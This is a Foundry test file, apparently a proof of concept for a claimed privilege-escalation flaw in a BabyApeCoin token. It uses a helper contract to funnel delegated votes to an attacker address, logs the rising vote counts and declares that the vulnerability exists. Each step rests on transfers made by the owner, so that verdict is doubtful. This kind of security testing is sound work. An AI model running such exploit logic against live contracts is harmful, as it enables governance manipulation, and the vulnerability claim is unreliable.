// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BabyApeCoin.sol";

contract MaliciousContract {
    BabyApeCoin token;
    
    constructor(BabyApeCoin _token) {
        token = _token;
    }
    
    function delegateFromContract(address _to) external {
        token.delegate(_to);
    }
}

contract EscalateTest is Test {
    BabyApeCoin token;
    address owner = address(0x01);
    address user1 = address(0x02);
    address attacker = address(0x03);
    MaliciousContract maliciousContract;
    uint256 constant MINT_AMOUNT = 10000 * 10**6 * 10**18;

    function setUp() public {
        vm.startPrank(owner);
        token = new BabyApeCoin();
        vm.stopPrank();
        
        maliciousContract = new MaliciousContract(token);
    }

    function testPrivilegeEscalation() public {
        uint256 attackAmount = 1000 ether;
        console.log("--- BEFORE Part1: Attacker votes ---");
        console.log(token.getCurrentVotes(attacker));
        vm.prank(owner);
        token.transfer(address(token), attackAmount);
        console.log("--- AFTER Part1: Attacker votes ---");
        console.log(token.getCurrentVotes(attacker));
        
        console.log("--- BEFORE Part2: Attacker votes ---");
        console.log(token.getCurrentVotes(attacker));
        vm.prank(owner);
        token.transferBabyApeByOwner(attacker, attackAmount);
        console.log("--- AFTER Part2: Attacker votes ---");
        console.log(token.getCurrentVotes(attacker));
        assertEq(token.balanceOf(attacker), attackAmount, "Attacker should have tokens");
        
        console.log("--- BEFORE Part3: Attacker votes ---");
        console.log(token.getCurrentVotes(attacker));
        vm.prank(attacker);
        token.delegate(attacker);
        uint256 currentVotes = token.getCurrentVotes(attacker);
        console.log("--- AFTER Part3: Attacker votes ---");
        console.log(currentVotes);
        assertEq(currentVotes, attackAmount, "Attacker should have votes from transferred tokens");
        
        uint256 maliciousAmount = 50000 ether;
        console.log("--- BEFORE Part4: Attacker votes ---");
        console.log(token.getCurrentVotes(attacker));
        vm.prank(owner);
        token.transfer(address(maliciousContract), maliciousAmount);
        console.log("--- AFTER Part4: Attacker votes ---");
        console.log(token.getCurrentVotes(attacker));
        
        console.log("--- BEFORE Part5: Attacker votes ---");
        console.log(token.getCurrentVotes(attacker));
        maliciousContract.delegateFromContract(attacker);
        currentVotes = token.getCurrentVotes(attacker);
        console.log("--- AFTER Part5: Attacker votes ---");
        console.log(currentVotes);
        assertEq(
            currentVotes, 
            attackAmount + maliciousAmount,
            "Attacker should have votes from malicious contract"
        );
        
        console.log("--- BEFORE Part6: Attacker votes ---");
        console.log(token.getCurrentVotes(attacker));
        vm.prank(owner);
        token.transfer(address(maliciousContract), 1000 ether);
        currentVotes = token.getCurrentVotes(attacker);
        console.log("--- AFTER Part6: Attacker votes ---");
        console.log(currentVotes);
        assertEq(
            currentVotes, 
            attackAmount + maliciousAmount + 1000 ether,
            "Transfer to malicious contract should increase attacker votes"
        );

        // Final vulnerability verification
        if (currentVotes == 52000 ether) {
            console.log("Vulnerability Exists: Attacker accumulated 52000 ether votes");
        } else {
            console.log("Vulnerability not Exist: Final votes do not match expected (52000 ether)");
            emit log_named_uint("Actual votes", currentVotes);
        }
    }
}